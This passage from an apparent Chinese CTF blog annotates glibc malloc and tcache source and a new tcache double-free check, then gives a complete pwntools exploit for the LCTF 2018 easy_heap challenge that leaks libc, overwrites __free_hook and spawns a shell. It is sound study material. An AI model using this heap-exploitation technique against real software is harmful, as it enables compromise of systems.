<h4 id="unsorted-bin"><a href="#unsorted-bin" class="headerlink" title="unsorted bin"></a>unsorted bin</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">     Process recently freed or remaindered chunks, taking one only if</span></span><br><span class="line"><span class="comment">     it is exact fit, or, if this a small request, the chunk is remainder from</span></span><br><span class="line"><span class="comment">     the most recent non-exact fit.  Place other traversed chunks in</span></span><br><span class="line"><span class="comment">     bins.  Note that this step is the only place in any routine where</span></span><br><span class="line"><span class="comment">     chunks are placed in bins.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">     The outer loop here is needed because we might not realize until</span></span><br><span class="line"><span class="comment">     near the end of malloc that we should have consolidated, so must</span></span><br><span class="line"><span class="comment">     do so and retry. This happens at most once, and only when we would</span></span><br><span class="line"><span class="comment">     otherwise need to expand memory to service a &quot;small&quot; request.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  INTERNAL_SIZE_T tcache_nb = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line">  <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins) <span class="comment">// 如果大小属于tcache范围</span></span><br><span class="line">    tcache_nb = nb; <span class="comment">// 赋值tcache_nb</span></span><br><span class="line">  <span class="keyword">int</span> return_cached = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  tcache_unsorted_count = <span class="number">0</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (;; )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">int</span> iters = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))</span><br><span class="line">        &#123;</span><br><span class="line">          bck = victim-&gt;bk; <span class="comment">// 大小检查</span></span><br><span class="line">          <span class="keyword">if</span> (__builtin_expect (chunksize_nomask (victim) &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">              || __builtin_expect (chunksize_nomask (victim)</span><br><span class="line">				   &gt; av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">            malloc_printerr (<span class="string">&quot;malloc(): memory corruption&quot;</span>);</span><br><span class="line">          size = chunksize (victim);</span><br><span class="line"></span><br><span class="line">          <span class="comment">/*</span></span><br><span class="line"><span class="comment">             If a small request, try to use last remainder if it is the</span></span><br><span class="line"><span class="comment">             only chunk in unsorted bin.  This helps promote locality for</span></span><br><span class="line"><span class="comment">             runs of consecutive small requests. This is the only</span></span><br><span class="line"><span class="comment">             exception to best-fit, and applies only when there is</span></span><br><span class="line"><span class="comment">             no exact fit for a small chunk.</span></span><br><span class="line"><span class="comment">           */</span></span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (in_smallbin_range (nb) &amp;&amp;</span><br><span class="line">              bck == unsorted_chunks (av) &amp;&amp;</span><br><span class="line">              victim == av-&gt;last_remainder &amp;&amp;</span><br><span class="line">              (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &gt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb + MINSIZE))</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="comment">/* split and reattach remainder */</span></span><br><span class="line">              remainder_size = size - nb;</span><br><span class="line">              remainder = chunk_at_offset (victim, nb);</span><br><span class="line">              unsorted_chunks (av)-&gt;bk = unsorted_chunks (av)-&gt;fd = remainder;</span><br><span class="line">              av-&gt;last_remainder = remainder;</span><br><span class="line">              remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks (av);</span><br><span class="line">              <span class="keyword">if</span> (!in_smallbin_range (remainder_size))</span><br><span class="line">                &#123;</span><br><span class="line">                  remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                  remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">              set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                        (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">              set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">              set_foot (remainder, remainder_size);</span><br><span class="line"></span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              <span class="keyword">return</span> p;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* remove from unsorted list */</span></span><br><span class="line">          unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">          bck-&gt;fd = unsorted_chunks (av);</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* Take now instead of binning if exact fit */</span></span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (size == nb) <span class="comment">// 如果大小正好匹配</span></span><br><span class="line">            &#123;</span><br><span class="line">              set_inuse_bit_at_offset (victim, size);</span><br><span class="line">              <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">		set_non_main_arena (victim);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">	      <span class="comment">/* Fill cache first, return to user only if cache fills.</span></span><br><span class="line"><span class="comment">		 We may return one of these chunks later.  */</span></span><br><span class="line">	      <span class="keyword">if</span> (tcache_nb</span><br><span class="line">		  &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)</span><br><span class="line">		&#123;</span><br><span class="line">		  tcache_put (victim, tc_idx); <span class="comment">// 放入tcache</span></span><br><span class="line">		  return_cached = <span class="number">1</span>;</span><br><span class="line">		  <span class="keyword">continue</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	      <span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">#endif</span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              <span class="keyword">return</span> p;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">		&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">            &#125; <span class="comment">// if (size == nb)</span></span><br><span class="line"></span><br><span class="line">          <span class="comment">/* place chunk in bin */</span></span><br><span class="line">		  <span class="comment">// 如果大小不相等，则放入相应的bin中</span></span><br><span class="line">          <span class="keyword">if</span> (in_smallbin_range (size))</span><br><span class="line">            &#123;</span><br><span class="line">              victim_index = smallbin_index (size);</span><br><span class="line">              bck = bin_at (av, victim_index);</span><br><span class="line">              fwd = bck-&gt;fd;</span><br><span class="line">            &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              victim_index = largebin_index (size);</span><br><span class="line">              bck = bin_at (av, victim_index);</span><br><span class="line">              fwd = bck-&gt;fd;</span><br><span class="line"></span><br><span class="line">              <span class="comment">/* maintain large bins in sorted order */</span></span><br><span class="line">              <span class="keyword">if</span> (fwd != bck)</span><br><span class="line">                &#123;</span><br><span class="line">                  <span class="comment">/* Or with inuse bit to speed comparisons */</span></span><br><span class="line">                  size |= PREV_INUSE;</span><br><span class="line">                  <span class="comment">/* if smaller than smallest, bypass loop below */</span></span><br><span class="line">                  assert (chunk_main_arena (bck-&gt;bk));</span><br><span class="line">                  <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size)</span><br><span class="line">		      &lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) chunksize_nomask (bck-&gt;bk))</span><br><span class="line">                    &#123;</span><br><span class="line">                      fwd = bck;</span><br><span class="line">                      bck = bck-&gt;bk;</span><br><span class="line"></span><br><span class="line">                      victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">                      victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">                      fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                    &#125;</span><br><span class="line">                  <span class="keyword">else</span></span><br><span class="line">                    &#123;</span><br><span class="line">                      assert (chunk_main_arena (fwd));</span><br><span class="line">                      <span class="keyword">while</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) size &lt; chunksize_nomask (fwd))</span><br><span class="line">                        &#123;</span><br><span class="line">                          fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">			  assert (chunk_main_arena (fwd));</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                      <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) size</span><br><span class="line">			  == (<span class="keyword">unsigned</span> <span class="keyword">long</span>) chunksize_nomask (fwd))</span><br><span class="line">                        <span class="comment">/* Always insert in the second position.  */</span></span><br><span class="line">                        fwd = fwd-&gt;fd;</span><br><span class="line">                      <span class="keyword">else</span></span><br><span class="line">                        &#123;</span><br><span class="line">                          victim-&gt;fd_nextsize = fwd;</span><br><span class="line">                          victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">                          fwd-&gt;bk_nextsize = victim;</span><br><span class="line">                          victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                        &#125;</span><br><span class="line">                      bck = fwd-&gt;bk;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">                victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          mark_bin (av, victim_index);</span><br><span class="line">          victim-&gt;bk = bck;</span><br><span class="line">          victim-&gt;fd = fwd;</span><br><span class="line">          fwd-&gt;bk = victim;</span><br><span class="line">          bck-&gt;fd = victim;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">      <span class="comment">/* If we&#x27;ve processed as many chunks as we&#x27;re allowed while</span></span><br><span class="line"><span class="comment">	 filling the cache, return one of the cached ones.  */</span></span><br><span class="line">      ++tcache_unsorted_count;</span><br><span class="line">      <span class="keyword">if</span> (return_cached</span><br><span class="line">	  &amp;&amp; mp_.tcache_unsorted_limit &gt; <span class="number">0</span> <span class="comment">/* tcache_unsorted_limit默认0，unlimit */</span></span><br><span class="line">	  &amp;&amp; tcache_unsorted_count &gt; mp_.tcache_unsorted_limit) </span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="keyword">return</span> tcache_get (tc_idx); <span class="comment">// 从tcache中返回chunk</span></span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_ITERS       10000</span></span><br><span class="line">          <span class="keyword">if</span> (++iters &gt;= MAX_ITERS)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">      <span class="comment">/* If all the small chunks we found ended up cached, return one now.  */</span></span><br><span class="line">      <span class="keyword">if</span> (return_cached)</span><br><span class="line">      <span class="comment">// 有完全匹配的chunk放入tcache后return_cached才会True</span></span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="keyword">return</span> tcache_get (tc_idx);</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure>

<h3 id="int-free"><a href="#int-free" class="headerlink" title="_int_free()"></a>_int_free()</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// malloc.c:4165 _int_free()的最前部位置</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">size_t</span> tc_idx = csize2tidx (size);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (tcache</span><br><span class="line">	&amp;&amp; tc_idx &lt; mp_.tcache_bins</span><br><span class="line">	&amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count) <span class="comment">// idx合法，bin仍有空间</span></span><br><span class="line">      &#123;</span><br><span class="line">	tcache_put (p, tc_idx); <span class="comment">// 放入tcache</span></span><br><span class="line">	<span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure>

<h2 id="Double-Free-Check"><a href="#Double-Free-Check" class="headerlink" title="Double Free Check"></a>Double Free Check</h2><p>昨天听说glibc的git上增加了一个<code>Tcache Double Free</code>的<code>check</code>的commit，就去看了下。</p>
<figure class="highlight diff"><table><tr><td class="code"><pre><span class="line"><span class="comment">--- a/malloc/malloc.c</span></span><br><span class="line"><span class="comment">+++ b/malloc/malloc.c</span></span><br><span class="line">@@ -2967,6 +2967,8 @@ mremap_chunk (mchunkptr p, size_t new_size)</span><br><span class="line"> typedef struct tcache_entry</span><br><span class="line"> &#123;</span><br><span class="line">   struct tcache_entry *next;</span><br><span class="line"><span class="addition">+  /* This field exists to detect double frees.  */</span></span><br><span class="line"><span class="addition">+  struct tcache_perthread_struct *key;</span></span><br><span class="line"> &#125; tcache_entry;</span><br><span class="line"> </span><br><span class="line"> /* There is one of these for each thread, which contains the</span><br><span class="line">@@ -2990,6 +2992,11 @@ tcache_put (mchunkptr chunk, size_t tc_idx)</span><br><span class="line"> &#123;</span><br><span class="line">   tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line">   assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  /* Mark this chunk as &quot;in the tcache&quot; so the test in _int_free will</span></span><br><span class="line"><span class="addition">+     detect a double free.  */</span></span><br><span class="line"><span class="addition">+  e-&gt;key = tcache;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line">   e-&gt;next = tcache-&gt;entries[tc_idx];</span><br><span class="line">   tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">   ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">@@ -3005,6 +3012,7 @@ tcache_get (size_t tc_idx)</span><br><span class="line">   assert (tcache-&gt;entries[tc_idx] &gt; 0);</span><br><span class="line">   tcache-&gt;entries[tc_idx] = e-&gt;next;</span><br><span class="line">   --(tcache-&gt;counts[tc_idx]);</span><br><span class="line"><span class="addition">+  e-&gt;key = NULL;</span></span><br><span class="line">   return (void *) e;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line">@@ -4218,6 +4226,26 @@ _int_free (mstate av, mchunkptr p, int have_lock)</span><br><span class="line">   &#123;</span><br><span class="line">     size_t tc_idx = csize2tidx (size);</span><br><span class="line"> </span><br><span class="line"><span class="addition">+    /* Check to see if it&#x27;s already in the tcache.  */</span></span><br><span class="line"><span class="addition">+    tcache_entry *e = (tcache_entry *) chunk2mem (p);</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+    /* This test succeeds on double free.  However, we don&#x27;t 100%</span></span><br><span class="line"><span class="addition">+       trust it (it also matches random payload data at a 1 in</span></span><br><span class="line"><span class="addition">+       2^&lt;size_t&gt; chance), so verify it&#x27;s not an unlikely coincidence</span></span><br><span class="line"><span class="addition">+       before aborting.  */</span></span><br><span class="line"><span class="addition">+    if (__glibc_unlikely (e-&gt;key == tcache &amp;&amp; tcache))</span></span><br><span class="line"><span class="addition">+      &#123;</span></span><br><span class="line"><span class="addition">+       tcache_entry *tmp;</span></span><br><span class="line"><span class="addition">+       LIBC_PROBE (memory_tcache_double_free, 2, e, tc_idx);</span></span><br><span class="line"><span class="addition">+       for (tmp = tcache-&gt;entries[tc_idx];</span></span><br><span class="line"><span class="addition">+            tmp;</span></span><br><span class="line"><span class="addition">+            tmp = tmp-&gt;next)</span></span><br><span class="line"><span class="addition">+         if (tmp == e)</span></span><br><span class="line"><span class="addition">+           malloc_printerr (&quot;free(): double free detected in tcache 2&quot;);</span></span><br><span class="line"><span class="addition">+       /* If we get here, it was a coincidence.  We&#x27;ve wasted a few</span></span><br><span class="line"><span class="addition">+          cycles, but don&#x27;t abort.  */</span></span><br><span class="line"><span class="addition">+      &#125;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line">     if (tcache</span><br><span class="line">        &amp;&amp; tc_idx &lt; mp_.tcache_bins</span><br><span class="line">        &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)</span><br></pre></td></tr></table></figure>

<p>在<code>tcache_entry</code>结构体中增加了<code>key</code>变量用于防止<code>double free</code>。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">  <span class="comment">/* This field exists to detect double frees.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span> *<span class="title">key</span>;</span></span><br><span class="line">&#125; tcache_entry;</span><br></pre></td></tr></table></figure>

<p>在<code>tcache_put()</code>中，<code>key</code>会被赋值为<code>tcache</code>，在<code>tcache_get()</code>中<code>key</code>会被置为<code>NULL</code>。</p>
<figure class="highlight diff"><table><tr><td class="code"><pre><span class="line">@@ -2990,6 +2992,11 @@ tcache_put (mchunkptr chunk, size_t tc_idx)</span><br><span class="line"> &#123;</span><br><span class="line">   tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line">   assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  /* Mark this chunk as &quot;in the tcache&quot; so the test in _int_free will</span></span><br><span class="line"><span class="addition">+     detect a double free.  */</span></span><br><span class="line"><span class="addition">+  e-&gt;key = tcache;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line">   e-&gt;next = tcache-&gt;entries[tc_idx];</span><br><span class="line">   tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">   ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">@@ -3005,6 +3012,7 @@ tcache_get (size_t tc_idx)</span><br><span class="line">   assert (tcache-&gt;entries[tc_idx] &gt; 0);</span><br><span class="line">   tcache-&gt;entries[tc_idx] = e-&gt;next;</span><br><span class="line">   --(tcache-&gt;counts[tc_idx]);</span><br><span class="line"><span class="addition">+  e-&gt;key = NULL;</span></span><br><span class="line">   return (void *) e;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p><code>doubule free</code>的<code>check</code>主要是在<code>_int_free()</code>中，如果<code>key</code>的值为<code>tcache</code>，就会对相应的<code>tcache bin</code>进行遍历（防止误伤，如果该chunk的<code>key</code>正好为<code>tcache</code>），如果找到相应的chunk，则报错。</p>
<figure class="highlight diff"><table><tr><td class="code"><pre><span class="line">@@ -4218,6 +4226,26 @@ _int_free (mstate av, mchunkptr p, int have_lock)</span><br><span class="line">   &#123;</span><br><span class="line">     size_t tc_idx = csize2tidx (size);</span><br><span class="line"> </span><br><span class="line"><span class="addition">+    /* Check to see if it&#x27;s already in the tcache.  */</span></span><br><span class="line"><span class="addition">+    tcache_entry *e = (tcache_entry *) chunk2mem (p);</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+    /* This test succeeds on double free.  However, we don&#x27;t 100%</span></span><br><span class="line"><span class="addition">+       trust it (it also matches random payload data at a 1 in</span></span><br><span class="line"><span class="addition">+       2^&lt;size_t&gt; chance), so verify it&#x27;s not an unlikely coincidence</span></span><br><span class="line"><span class="addition">+       before aborting.  */</span></span><br><span class="line"><span class="addition">+    if (__glibc_unlikely (e-&gt;key == tcache &amp;&amp; tcache))</span></span><br><span class="line"><span class="addition">+      &#123;</span></span><br><span class="line"><span class="addition">+       tcache_entry *tmp;</span></span><br><span class="line"><span class="addition">+       LIBC_PROBE (memory_tcache_double_free, 2, e, tc_idx);</span></span><br><span class="line"><span class="addition">+       for (tmp = tcache-&gt;entries[tc_idx];</span></span><br><span class="line"><span class="addition">+            tmp;</span></span><br><span class="line"><span class="addition">+            tmp = tmp-&gt;next)</span></span><br><span class="line"><span class="addition">+         if (tmp == e)</span></span><br><span class="line"><span class="addition">+           malloc_printerr (&quot;free(): double free detected in tcache 2&quot;);</span></span><br><span class="line"><span class="addition">+       /* If we get here, it was a coincidence.  We&#x27;ve wasted a few</span></span><br><span class="line"><span class="addition">+          cycles, but don&#x27;t abort.  */</span></span><br><span class="line"><span class="addition">+      &#125;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line">     if (tcache</span><br><span class="line">        &amp;&amp; tc_idx &lt; mp_.tcache_bins</span><br><span class="line">        &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)</span><br></pre></td></tr></table></figure>

<h2 id="LCTF-2018-easy-heap"><a href="#LCTF-2018-easy-heap" class="headerlink" title="LCTF 2018 easy_heap"></a>LCTF 2018 easy_heap</h2><p>才疏学浅，比赛的时候没做出来，又复习了一遍tcache。</p>
<p>当<code>malloc()</code>时，申请的大小正好与<code>unsorted bin</code>中的chunk大小一致时，会被放入<code>tcache</code>。由于<code>tcache</code>只利用前8字节保存链表信息，因此从<code>unsorted bin</code>中被放入<code>tcache</code>的chunk的<code>bk</code>的值仍然被保留。</p>
<p>利用堆块中残留的<code>bk</code>指针的信息，进行unlink攻击（本题构造的也很巧妙，使得写入\x00后，能够将指针地址指回chunk的头部）。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="comment"># 参考Nu1L writeup：https://xz.aliyun.com/t/3341</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Add</span>(<span class="params">p, size, content</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, str(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, str(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Delete</span>(<span class="params">p, idx</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, str(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Show</span>(<span class="params">p, idx</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, str(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>():</span></span><br><span class="line">    BIN_PATH = <span class="string">&#x27;./easy_heap&#x27;</span></span><br><span class="line">    DEBUG = <span class="number">1</span></span><br><span class="line">    context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> DEBUG == <span class="number">1</span>:</span><br><span class="line">        p = process(BIN_PATH)</span><br><span class="line">        elf = ELF(BIN_PATH)</span><br><span class="line">        context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">        context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;split&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> context.arch == <span class="string">&#x27;amd64&#x27;</span>:</span><br><span class="line">            libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            libc = ELF(<span class="string">&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">		<span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">        Add(p, <span class="number">0x20</span>, <span class="string">&#x27;sunichi&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    Delete(p, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>, <span class="number">8</span>):</span><br><span class="line">        Delete(p, i)</span><br><span class="line">    Delete(p, <span class="number">9</span>)</span><br><span class="line">    Delete(p, <span class="number">8</span>)</span><br><span class="line">    Delete(p, <span class="number">2</span>)</span><br><span class="line">    Delete(p, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">        Add(p, <span class="number">0x20</span>, <span class="string">&#x27;sunichi&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, str(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, str(<span class="number">0</span>))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;&gt; &#x27;</span>, <span class="string">&#x27;&#x27;</span>) <span class="comment"># change lowest byte of chunk address to 0x00</span></span><br><span class="line"></span><br><span class="line">    Add(p, <span class="number">0xf8</span>, <span class="string">&#x27;&#x27;</span>) <span class="comment"># off by null byte to let itself can be unlink</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">5</span>):</span><br><span class="line">        Delete(p, i)</span><br><span class="line">    Delete(p, <span class="number">6</span>)</span><br><span class="line">    Delete(p, <span class="number">5</span>) <span class="comment"># trigger unlink</span></span><br><span class="line">    Show(p, <span class="number">8</span>)</span><br><span class="line">    recv = p.recvuntil(<span class="string">&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>) + <span class="string">&#x27;\x00\x00&#x27;</span></span><br><span class="line">    libc.address = u64(recv) - (<span class="number">0x7ffff7dcfca0</span> - <span class="number">0x7ffff79e4000</span>)</span><br><span class="line">    <span class="keyword">print</span> hex(libc.address)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">        Add(p, <span class="number">0x20</span>, <span class="string">&#x27;sunichi&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    Add(p, <span class="number">0x20</span>, <span class="string">&#x27;sunichi&#x27;</span>)</span><br><span class="line">    Delete(p, <span class="number">0</span>)</span><br><span class="line">    Delete(p, <span class="number">8</span>)</span><br><span class="line">    Delete(p, <span class="number">1</span>)</span><br><span class="line">    Delete(p, <span class="number">9</span>)</span><br><span class="line"></span><br><span class="line">    Add(p, <span class="number">0x20</span>, p64(libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>])[:<span class="number">6</span>])</span><br><span class="line">    Add(p, <span class="number">0x20</span>, <span class="string">&#x27;sunichi&#x27;</span>)</span><br><span class="line">    Add(p, <span class="number">0x20</span>, <span class="string">&#x27;sunichi&#x27;</span>)</span><br><span class="line">    Add(p, <span class="number">0x20</span>, p64(libc.address + <span class="number">0x4f322</span>)[:<span class="number">6</span>])</span><br><span class="line"></span><br><span class="line">    Delete(p, <span class="number">1</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line">    p.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    pwn()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>ctf</tag>
        <tag>heap</tag>
        <tag>2018</tag>
        <tag>lctf</tag>
        <tag>tcache</tag>
      </tags>
  </entry>
  <entry>
    <title>【翻译&amp;复现】CVE-2017-11176分析(1)</title>
    <url>/2019/07/22/CVE-2017-11176-1/</url>
    <content><![CDATA[<p>根据lexfo博客进行的CVE-2017-11176分析和复现（第一部分）。</p>
<a id="more"></a>

<p>源自文章：</p>
<blockquote>
<p><a href="https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part1.html">https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part1.html</a></p>
<p><a href="https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part2.html">https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part2.html</a></p>
<p><a href="https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part3.html">https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part3.html</a></p>
<p><a href="https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part4.html">https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part4.html</a></p>
</blockquote>
